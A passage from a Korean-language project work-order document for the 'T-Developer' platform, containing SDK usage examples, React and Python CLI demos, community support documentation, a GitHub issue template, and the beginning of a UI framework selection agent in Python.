    maxClarificationRounds: 2,
    clarificationStrategy: "essential_only",
  },
});

// Provide defaults for common clarifications
const result = await client.analyzeProjectDescription({
  description: userInput,
  userId: "user_123",
  defaults: {
    projectType: "web_application",
    scalability: "medium",
    budget: "standard",
  },
});
```

### Debug Mode

```typescript
// Enable debug mode for detailed logs
const client = new NLInputClient({
  apiKey: "your-key",
  debug: true,
  logLevel: "verbose",
});

client.on("debug", (log) => {
  console.log(`[${log.level}] ${log.message}`, log.data);
});

// Analyze with trace ID for debugging
const result = await client.analyzeProjectDescription({
  description: userInput,
  userId: "user_123",
  options: {
    traceId: "debug-trace-123",
  },
});

// Get detailed analysis breakdown
const debug = await client.getAnalysisDebugInfo(result.projectId);
console.log("Processing steps:", debug.steps);
console.log("Decision tree:", debug.decisions);
console.log("Confidence factors:", debug.confidenceFactors);
```

````

**검증 기준**:
- [ ] 포괄적인 개발자 가이드
- [ ] 실용적인 코드 예제
- [ ] 문제 해결 가이드
- [ ] 모범 사례 문서화

#### SubTask 4.10.3: 샘플 애플리케이션 및 데모
**담당자**: 개발자 애드보케이트
**예상 소요시간**: 14시간

**작업 내용**:
```typescript
// examples/react-nl-agent-demo/src/App.tsx
import React, { useState, useCallback } from 'react';
import { NLInputClient, useNLInput } from '@t-developer/nl-agent-sdk';
import {
  Container,
  TextField,
  Button,
  Paper,
  Typography,
  LinearProgress,
  Alert,
  Chip,
  Box,
  Stepper,
  Step,
  StepLabel,
  Card,
  CardContent
} from '@mui/material';

// NL Agent Demo Application
const NLAgentDemo: React.FC = () => {
  const [activeStep, setActiveStep] = useState(0);
  const [description, setDescription] = useState('');
  const [clarificationAnswers, setClarificationAnswers] = useState<Record<string, string>>({});

  const { analyze, loading, error, result, client } = useNLInput({
    apiUrl: process.env.REACT_APP_API_URL!,
    apiKey: process.env.REACT_APP_API_KEY!
  });

  const steps = ['Describe Project', 'Clarify Requirements', 'Review Analysis', 'Generate Project'];

  const handleAnalyze = useCallback(async () => {
    try {
      const analysisResult = await analyze(description, 'demo-user');

      if (analysisResult.clarificationNeeded) {
        setActiveStep(1);
      } else {
        setActiveStep(2);
      }
    } catch (err) {
      console.error('Analysis failed:', err);
    }
  }, [description, analyze]);

  const handleClarification = useCallback(async () => {
    if (!result?.sessionId) return;

    try {
      const clarifiedResult = await client.processClarification(
        result.sessionId,
        clarificationAnswers
      );

      if (!clarifiedResult.furtherClarificationNeeded) {
        setActiveStep(2);
      }
    } catch (err) {
      console.error('Clarification failed:', err);
    }
  }, [client, result, clarificationAnswers]);

  return (
    <Container maxWidth="lg" sx={{ py: 4 }}>
      <Typography variant="h3" component="h1" gutterBottom align="center">
        T-Developer NL Agent Demo
      </Typography>

      <Typography variant="subtitle1" align="center" color="text.secondary" paragraph>
        Describe your project in natural language and watch AI convert it to structured requirements
      </Typography>

      <Stepper activeStep={activeStep} sx={{ mb: 4 }}>
        {steps.map((label) => (
          <Step key={label}>
            <StepLabel>{label}</StepLabel>
          </Step>
        ))}
      </Stepper>

      {/* Step 1: Project Description */}
      {activeStep === 0 && (
        <Paper elevation={3} sx={{ p: 4 }}>
          <Typography variant="h5" gutterBottom>
            Describe Your Project
          </Typography>

          <TextField
            fullWidth
            multiline
            rows={6}
            variant="outlined"
            placeholder="Example: I need an e-commerce website with user authentication, product catalog, shopping cart, and payment integration using Stripe. It should support mobile devices and handle 10,000 concurrent users."
            value={description}
            onChange={(e) => setDescription(e.target.value)}
            sx={{ mb: 3 }}
          />

          <Box sx={{ mb: 2 }}>
            <Typography variant="subtitle2" gutterBottom>
              Try these examples:
            </Typography>
            <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
              {exampleDescriptions.map((example, index) => (
                <Chip
                  key={index}
                  label={example.label}
                  onClick={() => setDescription(example.description)}
                  clickable
                  color="primary"
                  variant="outlined"
                />
              ))}
            </Box>
          </Box>

          <Button
            variant="contained"
            size="large"
            onClick={handleAnalyze}
            disabled={loading || description.length < 10}
            fullWidth
          >
            {loading ? <CircularProgress size={24} /> : 'Analyze Description'}
          </Button>

          {error && (
            <Alert severity="error" sx={{ mt: 2 }}>
              {error.message}
            </Alert>
          )}
        </Paper>
      )}

      {/* Step 2: Clarification */}
      {activeStep === 1 && result?.clarificationQuestions && (
        <Paper elevation={3} sx={{ p: 4 }}>
          <Typography variant="h5" gutterBottom>
            Help Us Understand Better
          </Typography>

          <Typography variant="body1" paragraph>
            Your description needs some clarification. Please answer these questions:
          </Typography>

          {result.clarificationQuestions.map((question) => (
            <ClarificationQuestion
              key={question.id}
              question={question}
              value={clarificationAnswers[question.id] || ''}
              onChange={(value) =>
                setClarificationAnswers(prev => ({
                  ...prev,
                  [question.id]: value
                }))
              }
            />
          ))}

          <Box sx={{ display: 'flex', gap: 2, mt: 3 }}>
            <Button
              variant="outlined"
              onClick={() => setActiveStep(0)}
            >
              Back
            </Button>
            <Button
              variant="contained"
              onClick={handleClarification}
              disabled={loading}
              sx={{ flex: 1 }}
            >
              Submit Answers
            </Button>
          </Box>
        </Paper>
      )}

      {/* Step 3: Analysis Results */}
      {activeStep === 2 && result?.requirements && (
        <Box sx={{ display: 'grid', gap: 3 }}>
          <AnalysisOverview requirements={result.requirements} />
          <TechnicalRequirements requirements={result.requirements.technicalRequirements} />
          <TechnologyStack stack={result.requirements.technologyPreferences} />
          <NonFunctionalRequirements nfrs={result.requirements.nonFunctionalRequirements} />

          <Box sx={{ display: 'flex', gap: 2 }}>
            <Button
              variant="outlined"
              onClick={() => {
                setActiveStep(0);
                setDescription('');
                setClarificationAnswers({});
              }}
            >
              Start Over
            </Button>
            <Button
              variant="contained"
              color="success"
              onClick={() => setActiveStep(3)}
              sx={{ flex: 1 }}
            >
              Generate Project
            </Button>
          </Box>
        </Box>
      )}

      {/* Step 4: Project Generation */}
      {activeStep === 3 && (
        <ProjectGenerationDemo requirements={result?.requirements} />
      )}
    </Container>
  );
};

// Example descriptions for demo
const exampleDescriptions = [
  {
    label: "E-commerce Platform",
    description: "Build a modern e-commerce platform with product catalog, user authentication, shopping cart, payment processing with Stripe, order management, and admin dashboard. Should support 10,000 concurrent users."
  },
  {
    label: "Social Media App",
    description: "Create a social media mobile app with user profiles, photo/video sharing, real-time messaging, news feed with ML-based recommendations, and live streaming capabilities."
  },
  {
    label: "Project Management Tool",
    description: "Develop a project management web application with task tracking, team collaboration, Gantt charts, time tracking, resource allocation, and integration with Slack and Jira."
  }
];

// Clarification Question Component
const ClarificationQuestion: React.FC<{
  question: any;
  value: string;
  onChange: (value: string) => void;
}> = ({ question, value, onChange }) => {
  return (
    <Card sx={{ mb: 2 }}>
      <CardContent>
        <Typography variant="h6" gutterBottom>
          {question.question}
        </Typography>

        {question.options ? (
          <Box sx={{ display: 'flex', gap: 1, flexWrap: 'wrap' }}>
            {question.options.map((option: string) => (
              <Chip
                key={option}
                label={option}
                onClick={() => onChange(option)}
                color={value === option ? "primary" : "default"}
                variant={value === option ? "filled" : "outlined"}
              />
            ))}
          </Box>
        ) : (
          <TextField
            fullWidth
            variant="outlined"
            value={value}
            onChange={(e) => onChange(e.target.value)}
            placeholder="Type your answer..."
          />
        )}

        {question.required && (
          <Typography variant="caption" color="error" sx={{ mt: 1 }}>
            * Required
          </Typography>
        )}
      </CardContent>
    </Card>
  );
};

// Analysis Overview Component
const AnalysisOverview: React.FC<{ requirements: any }> = ({ requirements }) => {
  return (
    <Paper elevation={3} sx={{ p: 3 }}>
      <Typography variant="h5" gutterBottom>
        Project Analysis Overview
      </Typography>

      <Box sx={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(200px, 1fr))', gap: 2 }}>
        <MetricCard
          title="Project Type"
          value={requirements.projectType.replace(/_/g, ' ')}
          icon="🚀"
        />
        <MetricCard
          title="Confidence Score"
          value={`${(requirements.confidenceScore * 100).toFixed(0)}%`}
          icon="📊"
        />
        <MetricCard
          title="Requirements"
          value={requirements.technicalRequirements.length}
          icon="📋"
        />
        <MetricCard
          title="Technologies"
          value={Object.values(requirements.technologyPreferences).flat().length}
          icon="🛠️"
        />
      </Box>
    </Paper>
  );
};

// Metric Card Component
const MetricCard: React.FC<{
  title: string;
  value: string | number;
  icon: string;
}> = ({ title, value, icon }) => {
  return (
    <Card>
      <CardContent sx={{ textAlign: 'center' }}>
        <Typography variant="h2">{icon}</Typography>
        <Typography variant="h4" color="primary">
          {value}
        </Typography>
        <Typography variant="subtitle2" color="text.secondary">
          {title}
        </Typography>
      </CardContent>
    </Card>
  );
};

export default NLAgentDemo;
````

```python
# examples/python-cli-demo/nl_agent_cli.py
#!/usr/bin/env python3
"""
T-Developer NL Agent CLI Demo

A command-line interface demonstrating the NL Agent capabilities.
"""

import click
import asyncio
from rich.console import Console
from rich.table import Table
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.panel import Panel
from rich.markdown import Markdown
from rich.prompt import Prompt, Confirm
import json
from t_developer_nl_agent import NLAgentClient

console = Console()

class NLAgentCLI:
    def __init__(self, api_key: str):
        self.client = NLAgentClient(api_key)
        self.session_data = {}

    async def analyze_interactive(self):
        """Interactive analysis flow"""

        console.print(Panel.fit(
            "[bold cyan]T-Developer NL Agent CLI[/bold cyan]\n"
            "Describe your project in natural language",
            title="Welcome"
        ))

        # Get project description
        description = Prompt.ask(
            "\n[yellow]Describe your project[/yellow]",
            default="I need a web application..."
        )

        # Show analysis progress
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task = progress.add_task("Analyzing project description...", total=None)

            result = await self.client.analyze_description(
                description=description,
                user_id="cli-demo-user"
            )

            progress.update(task, completed=100)

        # Store session data
        self.session_data = result

        # Handle clarifications if needed
        if result.get("clarification_needed"):
            await self.handle_clarifications(result)
        else:
            await self.display_results(result["requirements"])

    async def handle_clarifications(self, result):
        """Handle clarification questions"""

        console.print("\n[yellow]I need some clarification:[/yellow]\n")

        answers = {}
        for question in result["clarification_questions"]:
            console.print(f"[bold]{question['question']}[/bold]")

            if question.get("options"):
                # Multiple choice
                for i, option in enumerate(question["options"], 1):
                    console.print(f"  {i}. {option}")

                choice = Prompt.ask(
                    "Select an option",
                    choices=[str(i) for i in range(1, len(question["options"]) + 1)]
                )
                answers[question["id"]] = question["options"][int(choice) - 1]
            else:
                # Free text
                answers[question["id"]] = Prompt.ask("Your answer")

            console.print()

        # Process clarifications
        with Progress(
            SpinnerColumn(),
            TextColumn("[progress.description]{task.description}"),
            transient=True,
        ) as progress:
            task = progress.add_task("Processing clarifications...", total=None)

            clarified_result = await self.client.process_clarification(
                session_id=result["session_id"],
                answers=answers
            )

            progress.update(task, completed=100)

        await self.display_results(clarified_result["updated_requirements"])

    async def display_results(self, requirements):
        """Display analysis results"""

        console.print("\n[bold green]✓ Analysis Complete![/bold green]\n")

        # Project Overview
        overview_table = Table(title="Project Overview", show_header=False)
        overview_table.add_column("Property", style="cyan")
        overview_table.add_column("Value", style="white")

        overview_table.add_row("Project Type", requirements["project_type"])
        overview_table.add_row("Confidence Score", f"{requirements['confidence_score']:.2%}")
        overview_table.add_row("Requirements Count", str(len(requirements["technical_requirements"])))

        console.print(overview_table)

        # Technical Requirements
        if requirements["technical_requirements"]:
            console.print("\n[bold]Technical Requirements:[/bold]")
            req_table = Table()
            req_table.add_column("ID", style="dim")
            req_table.add_column("Description")
            req_table.add_column("Priority", justify="center")
            req_table.add_column("Category")

            for req in requirements["technical_requirements"]:
                priority_color = {
                    "high": "red",
                    "medium": "yellow",
                    "low": "green"
                }.get(req["priority"], "white")

                req_table.add_row(
                    req["id"],
                    req["description"],
                    f"[{priority_color}]{req['priority']}[/{priority_color}]",
                    req["category"]
                )

            console.print(req_table)

        # Technology Stack
        if requirements["technology_preferences"]:
            console.print("\n[bold]Recommended Technology Stack:[/bold]")
            tech_table = Table()
            tech_table.add_column("Layer", style="cyan")
            tech_table.add_column("Technologies")

            for layer, techs in requirements["technology_preferences"].items():
                tech_table.add_row(
                    layer.title(),
                    ", ".join(techs) if isinstance(techs, list) else str(techs)
                )

            console.print(tech_table)

        # Non-functional Requirements
        if requirements.get("non_functional_requirements"):
            console.print("\n[bold]Non-functional Requirements:[/bold]")
            for nfr in requirements["non_functional_requirements"]:
                console.print(f"• {nfr['type']}: {nfr['description']}")

        # Export options
        if Confirm.ask("\n[yellow]Export results to file?[/yellow]"):
            filename = Prompt.ask("Filename", default="project_requirements.json")

            with open(filename, 'w') as f:
                json.dump(requirements, f, indent=2)

            console.print(f"[green]✓ Exported to {filename}[/green]")

        # Generate project
        if Confirm.ask("\n[yellow]Generate project scaffold?[/yellow]"):
            await self.generate_project(requirements)

    async def generate_project(self, requirements):
        """Generate project based on requirements"""

        console.print("\n[bold]Generating Project Structure...[/bold]\n")

        # This would integrate with the project generation agent
        project_structure = {
            "name": "my-project",
            "type": requirements["project_type"],
            "structure": {
                "src/": ["index.js", "app.js"],
                "tests/": ["app.test.js"],
                "docs/": ["README.md", "API.md"],
                "config/": ["config.js"],
                ".gitignore": None,
                "package.json": None,
                "Dockerfile": None
            }
        }

        # Display generated structure
        console.print("[green]Generated project structure:[/green]")
        for path, files in project_structure["structure"].items():
            console.print(f"  📁 {path}")
            if files:
                for file in files:
                    console.print(f"    📄 {file}")

@click.command()
@click.option('--api-key', envvar='NL_AGENT_API_KEY', help='API key for NL Agent')
@click.option('--mode', type=click.Choice(['interactive', 'batch', 'demo']), default='interactive')
@click.option('--input-file', type=click.File('r'), help='Input file for batch mode')
@click.option('--output-file', type=click.File('w'), help='Output file for results')
def main(api_key, mode, input_file, output_file):
    """T-Developer NL Agent CLI Demo"""

    if not api_key:
        console.print("[red]Error: API key required. Set NL_AGENT_API_KEY or use --api-key[/red]")
        return

    cli = NLAgentCLI(api_key)

    if mode == 'interactive':
        asyncio.run(cli.analyze_interactive())
    elif mode == 'batch' and input_file:
        # Batch processing mode
        asyncio.run(cli.process_batch(input_file, output_file))
    elif mode == 'demo':
        # Demo mode with predefined examples
        asyncio.run(cli.run_demo())
    else:
        console.print("[red]Invalid mode or missing input file[/red]")

if __name__ == '__main__':
    main()
```

**검증 기준**:

- [ ] React 웹 애플리케이션 데모
- [ ] Python CLI 데모
- [ ] 인터랙티브 예제
- [ ] 실제 사용 사례 시연

#### SubTask 4.10.4: 커뮤니티 및 지원 체계

**담당자**: 개발자 관계 매니저  
**예상 소요시간**: 8시간

**작업 내용**:

```markdown
# backend/docs/community/nl-agent-community.md

# NL Agent Community & Support

## Community Resources

### 1. Discord Server

Join our active Discord community for real-time support and discussions.

**Server: [discord.gg/t-developer](https://discord.gg/t-developer)**

Channels:

- `#nl-agent-general` - General discussions
- `#nl-agent-help` - Get help with integration
- `#nl-agent-showcase` - Share your projects
- `#nl-agent-feedback` - Feature requests and feedback
- `#nl-agent-announcements` - Updates and releases

### 2. GitHub Repository

Contribute to the SDK and report issues.

**Repository: [github.com/t-developer/nl-agent-sdk](https://github.com/t-developer/nl-agent-sdk)**

- [Issues](https://github.com/t-developer/nl-agent-sdk/issues) - Report bugs and request features
- [Discussions](https://github.com/t-developer/nl-agent-sdk/discussions) - Community discussions
- [Wiki](https://github.com/t-developer/nl-agent-sdk/wiki) - Community-maintained documentation
- [Contributing Guide](https://github.com/t-developer/nl-agent-sdk/blob/main/CONTRIBUTING.md)

### 3. Stack Overflow

Ask and answer technical questions.

**Tag: [`t-developer-nl-agent`](https://stackoverflow.com/questions/tagged/t-developer-nl-agent)**

Example question format:
```

Title: How to handle timeout errors in NL Agent batch processing?

Tags: t-developer-nl-agent, javascript, async

I'm using the T-Developer NL Agent SDK version 1.2.3 and encountering
timeout errors when processing multiple descriptions...

[Include code example]
[Include error message]
[Include what you've tried]

````

### 4. Community Forum
Deep discussions and knowledge sharing.

**Forum: [community.t-developer.com/nl-agent](https://community.t-developer.com/nl-agent)**

Categories:
- Tutorials & Guides
- Integration Examples
- Performance Optimization
- Feature Discussions
- Show & Tell

## Support Channels

### 1. Documentation & Self-Service

#### Official Documentation
- [API Reference](https://docs.t-developer.com/nl-agent/api)
- [Integration Guides](https://docs.t-developer.com/nl-agent/guides)
- [Examples](https://docs.t-developer.com/nl-agent/examples)
- [FAQ](https://docs.t-developer.com/nl-agent/faq)

#### Video Tutorials
- [Getting Started (YouTube)](https://youtube.com/t-developer/nl-agent-intro)
- [Advanced Features (YouTube)](https://youtube.com/t-developer/nl-agent-advanced)
- [Webinar Recordings](https://t-developer.com/webinars/nl-agent)

### 2. Technical Support

#### Free Support
- Community Discord (#nl-agent-help)
- GitHub Issues
- Stack Overflow
- Community Forum

**Response Time**: Community-driven, typically 24-48 hours

#### Pro Support
Available for Pro and Enterprise customers.

- Dedicated Slack channel
- Email support: nl-support@t-developer.com
- Priority issue handling
- Direct access to engineering team

**Response Time**:
- Pro: 24 hours
- Enterprise: 4 hours (business hours)

#### Enterprise Support
- Dedicated support engineer
- Custom integration assistance
- Performance optimization consulting
- Training sessions
- SLA guarantees

**Contact**: enterprise@t-developer.com

### 3. Office Hours

**Weekly Office Hours**
Every Thursday at 2 PM PST / 5 PM EST / 10 PM GMT

- Live Q&A with the NL Agent team
- Demo of new features
- Community showcase
- Troubleshooting help

**Join**: [meet.t-developer.com/nl-agent-office-hours](https://meet.t-developer.com/nl-agent-office-hours)

## Contributing

### Ways to Contribute

#### 1. Code Contributions
```bash
# Fork and clone the repository
git clone https://github.com/YOUR_USERNAME/nl-agent-sdk.git
cd nl-agent-sdk

# Create a feature branch
git checkout -b feature/your-feature-name

# Make your changes and test
npm test

# Submit a pull request
````

#### 2. Documentation

- Fix typos and improve clarity
- Add examples and use cases
- Translate documentation
- Write tutorials and guides

#### 3. Community Support

- Answer questions on Discord/Forum
- Share your integration experiences
- Create video tutorials
- Write blog posts

#### 4. Bug Reports & Feature Requests

Use our issue templates on GitHub:

- [Bug Report Template](.github/ISSUE_TEMPLATE/bug_report.md)
- [Feature Request Template](.github/ISSUE_TEMPLATE/feature_request.md)

### Recognition Program

#### Community Champions

Active contributors receive:

- Special Discord role and badge
- Early access to new features
- Monthly swag packages
- Annual conference tickets
- Direct line to product team

#### Hall of Fame

Top contributors featured on our website and documentation.

Current Champions:

- @developer1 - 50+ answered questions
- @developer2 - Major performance optimization
- @developer3 - Comprehensive Python tutorials

## Events & Meetups

### 1. Annual Conference

**T-Developer Summit**

- Date: October 15-17, 2024
- Location: San Francisco + Virtual
- NL Agent track with workshops

### 2. Monthly Meetups

Virtual meetups every first Tuesday:

- Feature deep dives
- Use case presentations
- Q&A sessions
- Networking

### 3. Hackathons

Quarterly hackathons with prizes:

- Best NL Agent Integration
- Most Creative Use Case
- Performance Innovation

## Resources

### 1. Starter Kits

- [React Starter](https://github.com/t-developer/nl-agent-react-starter)
- [Node.js Starter](https://github.com/t-developer/nl-agent-node-starter)
- [Python Starter](https://github.com/t-developer/nl-agent-python-starter)

### 2. Plugins & Extensions

- [VS Code Extension](https://marketplace.visualstudio.com/items?itemName=t-developer.nl-agent)
- [Chrome DevTools Extension](https://chrome.google.com/webstore/detail/nl-agent-devtools)
- [Postman Collection](https://www.postman.com/t-developer/workspace/nl-agent)

### 3. Third-party Libraries

Community-maintained integrations:

- [nl-agent-ruby](https://rubygems.org/gems/nl-agent-ruby) - Ruby SDK
- [nl-agent-go](https://pkg.go.dev/github.com/community/nl-agent-go) - Go SDK
- [nl-agent-rust](https://crates.io/crates/nl-agent-rust) - Rust SDK

## Stay Updated

### 1. Newsletter

Monthly updates on features, tips, and community highlights.

**Subscribe**: [t-developer.com/nl-agent/newsletter](https://t-developer.com/nl-agent/newsletter)

### 2. Social Media

- Twitter: [@TDeveloperAI](https://twitter.com/TDeveloperAI)
- LinkedIn: [T-Developer](https://linkedin.com/company/t-developer)
- Dev.to: [t-developer](https://dev.to/t-developer)

### 3. RSS/Atom Feeds

- [Product Updates](https://t-developer.com/nl-agent/feed.xml)
- [Blog Posts](https://blog.t-developer.com/nl-agent/feed.xml)
- [Community Posts](https://community.t-developer.com/nl-agent/feed.xml)

## Code of Conduct

We are committed to providing a welcoming and inclusive community.

### Our Standards

- Be respectful and inclusive
- Welcome newcomers and help them learn
- Accept constructive criticism gracefully
- Focus on what's best for the community
- Show empathy towards others

### Reporting Issues

Report violations to: conduct@t-developer.com

Full Code of Conduct: [t-developer.com/code-of-conduct](https://t-developer.com/code-of-conduct)

````

```yaml
# .github/ISSUE_TEMPLATE/bug_report.yml
name: Bug Report
description: Report a bug in the NL Agent
title: "[BUG] "
labels: ["bug", "needs-triage"]
assignees:
  - nl-agent-team

body:
  - type: markdown
    attributes:
      value: |
        Thanks for taking the time to report a bug! Please fill out the information below.

  - type: textarea
    id: description
    attributes:
      label: Bug Description
      description: A clear and concise description of the bug
      placeholder: The NL Agent fails to analyze descriptions containing...
    validations:
      required: true

  - type: textarea
    id: reproduction
    attributes:
      label: Steps to Reproduce
      description: Steps to reproduce the behavior
      value: |
        1. Initialize client with...
        2. Call analyze with...
        3. See error...
    validations:
      required: true

  - type: textarea
    id: expected
    attributes:
      label: Expected Behavior
      description: What you expected to happen
    validations:
      required: true

  - type: textarea
    id: actual
    attributes:
      label: Actual Behavior
      description: What actually happened
    validations:
      required: true

  - type: dropdown
    id: sdk-version
    attributes:
      label: SDK Version
      options:
        - 1.0.0
        - 1.1.0
        - 1.2.0
        - 1.2.1
        - 1.2.2
        - 1.2.3 (latest)
    validations:
      required: true

  - type: dropdown
    id: language
    attributes:
      label: Programming Language
      options:
        - JavaScript/TypeScript
        - Python
        - Java
        - C#
        - Other
    validations:
      required: true

  - type: textarea
    id: code-sample
    attributes:
      label: Code Sample
      description: Minimal code to reproduce the issue
      render: javascript
      placeholder: |
        const client = new NLInputClient({...});
        const result = await client.analyze({...});

  - type: textarea
    id: error-logs
    attributes:
      label: Error Logs
      description: Any error messages or logs
      render: shell

  - type: checkboxes
    id: terms
    attributes:
      label: Checklist
      options:
        - label: I have searched existing issues
          required: true
        - label: I have read the documentation
          required: true
        - label: I am using the latest SDK version
          required: false
````

**검증 기준**:

- [ ] 활발한 커뮤니티 플랫폼
- [ ] 다단계 지원 체계
- [ ] 기여자 인센티브 프로그램
- [ ] 정기적인 커뮤니티 이벤트

---

# UI Selection Agent 작업지시서 (Tasks 4.11-4.20)

## Task 4.11: UI Selection Agent 코어 구현

### SubTask 4.11.1: UI 프레임워크 분석 엔진

**담당자**: 시니어 AI 엔지니어  
**예상 소요시간**: 16시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/core_engine.py
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass
from enum import Enum
import asyncio
from agno.agent import Agent
from agno.models.aws import AwsBedrock
from agno.models.openai import OpenAIChat

@dataclass
class ProjectRequirements:
    project_type: str  # web, mobile, desktop
    description: str
    technical_requirements: List[str]
    non_functional_requirements: List[str]
    scale: str  # prototype, small, medium, enterprise
    team_expertise: List[str]
    constraints: Dict[str, Any]
    target_platforms: List[str]

@dataclass
class FrameworkAnalysis:
    framework_name: str
    category: str  # spa, ssr, mobile, desktop
    score: float
    match_reasons: List[str]
    mismatch_reasons: List[str]
    technical_fit: float
    team_fit: float
    ecosystem_fit: float
    performance_metrics: Dict[str, float]

class UIFrameworkAnalyzer:
    """UI 프레임워크 분석 엔진"""

    def __init__(self):
        # 주 분석 엔진 - GPT-4
        self.analyzer = Agent(
            name="UI-Framework-Analyzer",
            model=OpenAIChat(id="gpt-4-turbo-preview"),
            role="Expert UI/UX architect and framework specialist",
            instructions=[
                "Analyze project requirements and match with UI frameworks",
                "Consider technical requirements, team expertise, and constraints",
                "Evaluate framework ecosystem, performance, and community support",
                "Provide detailed reasoning for recommendations"
            ],
            temperature=0.3
        )

        # 보조 분석 엔진 - Claude (크로스 체크)
        self.validator = Agent(
            name="Framework-Validator",
            model=AwsBedrock(
                id="anthropic.claude-3-sonnet-20240229-v1:0",
                region="us-east-1"
            ),
            role="Senior technical architect for validation",
            temperature=0.2
        )

        self.framework_db = self._initialize_framework_database()

    def _initialize_framework_database(self) -> Dict[str, Dict[str, Any]]:
        """프레임워크 데이터베이스 초기화"""
        return {
            'react': {
                'category': 'spa',
                'languages': ['javascript', 'typescript'],
                'learning_curve': 'moderate',
                'ecosystem': 'excellent',
                'performance': {
                    'bundle_size': 'medium',
                    'runtime_performance': 'good',
                    'build_time': 'fast'
                },
                'use_cases': [
                    'complex_spa', 'dashboard', 'real_time',
                    'component_library', 'enterprise'
                ],
                'strengths': [
                    'huge_ecosystem', 'component_reusability',
                    'strong_community', 'flexibility'
                ],
                'weaknesses': [
                    'steep_learning_curve', 'boilerplate',
                    'decision_fatigue'
                ]
            },
            'vue': {
                'category': 'spa',
                'languages': ['javascript', 'typescript'],
                'learning_curve': 'easy',
                'ecosystem': 'good',
                'performance': {
                    'bundle_size': 'small',
                    'runtime_performance': 'excellent',
                    'build_time': 'fast'
                },
                'use_cases': [
                    'spa', 'progressive_enhancement',
                    'small_to_medium', 'rapid_prototyping'
                ]
            },
            'angular': {
                'category': 'spa',
                'languages': ['typescript'],
                'learning_curve': 'steep',
                'ecosystem': 'excellent',
                'performance': {
                    'bundle_size': 'large',
                    'runtime_performance': 'good',
                    'build_time': 'slow'
                },
                'use_cases': [
                    'enterprise', 'large_team',
                    'complex_forms', 'long_term'
                ]
            },
            'nextjs': {
                'category': 'ssr',
                'base_framework': 'react',
                'languages': ['javascript', 'typescript'],
                'learning_curve': 'moderate',
                'ecosystem': 'excellent',
                'performance': {
                    'bundle_size': 'optimized',
                    'runtime_performance': 'excellent',
                    'build_time': 'moderate'
                },
                'use_cases': [
                    'seo_critical', 'ecommerce', 'blog',
                    'marketing_site', 'hybrid_app'
                ]
            },
            'flutter': {
                'category': 'mobile',
                'languages': ['dart'],
                'learning_curve': 'moderate',
                'ecosystem': 'growing',
                'performance': {
                    'app_size': 'medium',
                    'runtime_performance': 'native_like',
                    'build_time': 'fast'
                },
                'use_cases': [
                    'cross_platform_mobile', 'material_design',
                    'custom_ui', 'startup_mvp'
                ]
            }
            # ... 더 많은 프레임워크 정의
        }

    async def analyze_requirements(
        self,
        requirements: ProjectRequirements
    ) -> List[FrameworkAnalysis]:
        """요구사항 분석 및 프레임워크 매칭"""

        # 1. 요구사항 전처리
        processed_req = await self._preprocess_requirements(requirements)

        # 2. 초기 프레임워크 필터링
        candidate_frameworks = self._filter_frameworks(processed_req)

        # 3. 각 프레임워크 상세 분석
        analyses = []
        for framework in candidate_frameworks:
            analysis = await self._analyze_framework_fit(
                framework,
                processed_req
            )
            analyses.append(analysis)

        # 4. 점수 기반 정렬
        analyses.sort(key=lambda x: x.score, reverse=True)

        # 5. 교차 검증
        validated_analyses = await self._cross_validate(analyses, requirements)

        return validated_analyses

    async def _analyze_framework_fit(
        self,
        framework_name: str,
        requirements: Dict[str, Any]
    ) -> FrameworkAnalysis:
        """개별 프레임워크 적합도 분석"""

        framework_info = self.framework_db[framework_name]

        # AI 기반 분석
        prompt = f"""
        Analyze the fit between the project requirements and {framework_name}.

        Project Requirements:
        {requirements}

        Framework Info:
        {framework_info}

        Provide:
        1. Technical fit score (0-1)
        2. Team fit score (0-1)
        3. Ecosystem fit score (0-1)
        4. Match reasons
        5. Mismatch reasons
        """

        analysis_result = await self.analyzer.run(prompt)

        # 결과 파싱 및 구조화
        return self._parse_analysis_result(
            framework_name,
            analysis_result,
            framework_info
        )
```

**검증 기준**:

- [ ] 15개 이상의 프레임워크 지원
- [ ] 요구사항 분석 정확도 90% 이상
- [ ] 프레임워크별 상세 메타데이터 완성
- [ ] AI 모델 통합 및 프롬프트 최적화

---

### SubTask 4.11.2: 요구사항 기반 평가 시스템

**담당자**: 백엔드 개발자  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/evaluation_system.py
from typing import Dict, List, Optional, Set, Tuple
from dataclasses import dataclass, field
import numpy as np
from sklearn.preprocessing import MinMaxScaler

@dataclass
class EvaluationCriteria:
    name: str
    weight: float
    sub_criteria: List['SubCriteria'] = field(default_factory=list)

@dataclass
class SubCriteria:
    name: str
    weight: float
    scoring_function: str  # 평가 함수 이름
    parameters: Dict[str, Any] = field(default_factory=dict)

class RequirementEvaluator:
    """요구사항 기반 프레임워크 평가 시스템"""

    def __init__(self):
        self.criteria = self._initialize_criteria()
        self.scaler = MinMaxScaler()
        self.requirement_patterns = self._load_requirement_patterns()

    def _initialize_criteria(self) -> List[EvaluationCriteria]:
        """평가 기준 초기화"""
        return [
            EvaluationCriteria(
                name="technical_fit",
                weight=0.35,
                sub_criteria=[
                    SubCriteria(
                        name="architecture_match",
                        weight=0.4,
                        scoring_function="score_architecture_match"
                    ),
                    SubCriteria(
                        name="feature_support",
                        weight=0.3,
                        scoring_function="score_feature_support"
                    ),
                    SubCriteria(
                        name="performance_requirements",
                        weight=0.3,
                        scoring_function="score_performance_match"
                    )
                ]
            ),
            EvaluationCriteria(
                name="team_fit",
                weight=0.25,
                sub_criteria=[
                    SubCriteria(
                        name="skill_match",
                        weight=0.5,
                        scoring_function="score_skill_match"
                    ),
                    SubCriteria(
                        name="learning_curve",
                        weight=0.3,
                        scoring_function="score_learning_curve"
                    ),
                    SubCriteria(
                        name="productivity",
                        weight=0.2,
                        scoring_function="score_productivity"
                    )
                ]
            ),
            EvaluationCriteria(
                name="project_fit",
                weight=0.25,
                sub_criteria=[
                    SubCriteria(
                        name="scale_appropriateness",
                        weight=0.4,
                        scoring_function="score_scale_fit"
                    ),
                    SubCriteria(
                        name="timeline_feasibility",
                        weight=0.3,
                        scoring_function="score_timeline_fit"
                    ),
                    SubCriteria(
                        name="maintenance_cost",
                        weight=0.3,
                        scoring_function="score_maintenance"
                    )
                ]
            ),
            EvaluationCriteria(
                name="ecosystem_quality",
